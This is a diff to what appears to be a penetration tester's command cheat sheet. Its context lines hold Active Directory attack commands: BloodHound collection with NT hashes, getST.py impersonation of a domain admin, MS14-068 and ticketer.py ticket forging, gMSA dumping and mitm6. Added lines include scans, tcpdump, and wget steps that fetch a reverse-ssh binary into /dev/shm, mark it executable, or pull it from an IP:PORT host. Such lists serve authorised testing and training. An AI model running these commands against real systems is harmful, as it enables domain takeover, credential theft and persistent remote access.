@@ -30,6 +30,7 @@ bloodhound-import -du neo4j -dp exegol4thewin *.json
 bloodhound-quickwin -u neo4j -p exegol4thewin
 bloodhound.py --zip -c All -d "$DOMAIN" -u "$USER" --hashes 'ffffffffffffffffffffffffffffffff':"$NT_HASH" -dc "$DC_HOST"
 bloodhound.py --zip -c All -d "$DOMAIN" -u "$USER" -p "$PASSWORD" -dc "$DC_HOST"
+cat 20220426210232_users.json | jq '.data[].Properties'
 cat mailroom-ffuf.json| jq '.results[]|select(.status == '200')' | jq -c '{url:.url,length:.length}' | sort -u -t, -k2 | awk -F '"' '{print $4}' > 200.txt
 cat mailroom-ffuf.json| jq '.results[]|select(.status == '403')' | jq -c '{url:.url,length:.length}' | sort -u -t, -k2 | awk -F '"' '{print $4}' > 200.txt
 cat mailroom-ffuf.json| jq '.results[]|select(.status == '404')' | jq -c '{url:.url,length:.length}' | sort -u -t, -k2 | awk -F '"' '{print $4}' > 200.txt
@@ -92,6 +93,7 @@ ffuf -c -t 10 -rate 100 -p 0.1 -H "User-Agent: $AGENT" -ac -o $NAME.json -of jso
 ffuf -c -t 10 -rate 100 -p 0.1 -H "User-Agent: $AGENT" -r -ac -o $NAME.json -of json -mc 200,302,403 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u http://$DOMAIN/FUZZ
 ffuf -c -t 10 -rate 100 -p 0.1 -o $NAME_domains.json -of json -H "Host:FUZZ.$DOMAIN" -mc 200,403 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://$DOMAIN/
 ffuf -request REQUESTFILE -request-proto http -w PATH/TO/WORDLIST -fs 0 -c
+find DIR -type f -newermt YYYY-MM-DD ! -newermt YYYY-MM-DD > /dev/null
 gMSADumper.py -d "$DOMAIN" -l "$DC_HOST" -u "$USER" -p "$PASSWORD"
 getST.py -k -no-pass -spn host/"$DC_HOST" "$DOMAIN"/"$USER"
 getST.py -spn "host/$TARGET" -impersonate 'domainadmin' -dc-ip "$DC_IP" "$DOMAIN"/'EXEGOL-01$':'exegol4thewin'
@@ -141,6 +143,7 @@ masscan -v -p 1-65535 --rate=10000 -e eth0 192.168.56.0/24
 masscan -v -p 1-65535,U:1-65535 --rate=10000 -e eth0 192.168.56.0/24
 mitm6 --interface eth0
 mitm6 --interface eth0 --domain "$DOMAIN"
+mkdir -p test/{recon,exploit,report}
 moodlescan -r -u "http://$TARGET/"
 mount -o domain="$DOMAIN" -o username="$USER" -o password="$PASSWORD" -t cifs "//$DC_HOST/SYSVOL" /tmp/mnttarget/
 ms14-068.py -u "$USER"@"$DOMAIN" --rc4 "$NT_HASH" -s "$DOMAIN_SID" -d "$DC_HOST"
@@ -262,12 +265,15 @@ sqlmap -u "http://localhost:8081/?id=" --risk 3 --level 5
 ssh $USER@$DOMAIN 
 ssh $USER@$IP
 ssh-keygen -t rsa -b 4096 -f keyname
+stat FILE
 subfinder -d freelancer.com
 subjack -w subdomains.txt -t 100 -timeout 30 -o results.txt -ssl
 sublist3r -v -d "$DOMAIN"
 sudo impacket-smbserver share . -smb2support
 sudo nmap -sU --min-rate 10000 --reason IP
 sudo nmap -sU --min-rate 10000 -oA nmap/udp $IP -v
+sudo nmap -sU --top-ports 10 IP -v
+sudo tcpdump -v -w capture.cap
 theHarvester -d github.com -b all
 theHarvester.py -d "$DOMAIN" -g -s -r -f "$DOMAIN.xml" -b all
 ticketer.py -nthash "$NT_HASH" -domain-sid S-1-5-11-39129514-1145628974-103568174 -domain "$DOMAIN" randomuser
@@ -277,6 +283,9 @@ tls-scanner -connect "$TARGET":443
 toutatis.py -s SESSIONID -u starbucks
 turbo -d $DOMAIN -t 5
 waybackurls test.com
+wget -r --no-parent --reject "index.html*" $ADDRESS
+wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh
+wget http://IP:PORT/reverse-ssh
 whatweb -a 1 -U=$AGENT -t 10 --wait=0.2 http://$IP/
 whatweb http://$IP/
 whatweb https://$IP/
